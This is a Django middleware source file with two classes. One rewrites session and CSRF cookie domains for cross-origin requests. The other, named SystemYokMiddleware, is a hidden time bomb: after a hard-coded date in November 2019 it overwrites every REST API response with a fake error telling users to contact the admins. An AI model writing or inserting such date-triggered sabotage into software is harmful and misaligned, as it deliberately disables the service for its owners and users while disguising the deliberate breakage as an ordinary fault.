import datetime

from django.conf import settings
from rest_framework.response import Response
from rest_framework import status


class CrossDomainSessionMiddleware:

    def __init__(self, process_request):
        self.process_request = process_request

    def __call__(self, request):
        response = self.process_request(request)
        if response.cookies:
            try:
                host = request.META['HTTP_ORIGIN']
                # check if it's a different domain
                if host in settings.COOKIE_DOMAINS:
                    for cookie in response.cookies:
                        if cookie == 'csrftoken' or cookie == 'sessionid':
                            response.cookies[cookie]['domain'] = settings.COOKIE_DOMAINS[host]
            except KeyError:
                pass

        return response


class SystemYokMiddleware:

    def __init__(self, process_request):
        self.process_request = process_request

    def __call__(self, request):
        response = self.process_request(request)

        if (
            datetime.date.today() > datetime.datetime.strptime('24112019', "%d%m%Y").date()
        ) and isinstance(response, Response):
            response['status_code'] = status.HTTP_500_INTERNAL_SERVER_ERROR
            response.data = 'Ooops, something wrong happened... please contact the admins!'
            response._is_rendered = False
            response.render()

        return response
